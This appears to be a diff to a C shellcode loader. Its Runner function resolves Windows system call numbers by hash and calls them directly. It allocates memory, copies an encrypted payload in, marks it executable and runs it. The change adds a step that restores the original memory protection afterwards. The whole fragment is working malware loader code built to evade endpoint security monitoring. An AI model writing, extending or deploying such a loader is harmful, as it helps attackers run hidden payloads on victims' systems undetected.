@@ -45,13 +45,10 @@ WORD Runner(void){
 POOP:
     if (TRUE){}
     GetSyscallList(&List);
-
     GetSSN(&List, allocatevirtualmemory_hash, &SsnId);
     NTSTATUS status = ZwX(SsnId, NtCurrentProcess(), &desiredBase, 0, (PSIZE_T)&sz, MEM_COMMIT, PAGE_READWRITE);  // as ntallocatevirtualmemory
     if (status != STATUS_SUCCESS) return;
-    
     memcpy(desiredBase, encrypted_instructions, OG_PAYLOAD_LEN);
-    
     // get syscall for ntprotectvirtualmemory
     GetSSN(&List, protectvirtualmemory_hash, &SsnId);
     status = ZwX(SsnId, NtCurrentProcess(), &desiredBase, &sz, PAGE_EXECUTE_READWRITE, &dwOldProtect); // as ntprotectvirtualmemory
@@ -59,6 +56,8 @@ POOP:
     // printf("[+] executing!\n");
     // exec
     ((fnAddr)desiredBase)();
+    status = ZwX(SsnId, NtCurrentProcess(), &desiredBase, &sz, dwOldProtect, &dwOldProtect);
+    if (status != STATUS_SUCCESS) {return;}
     return 0;
 }
 
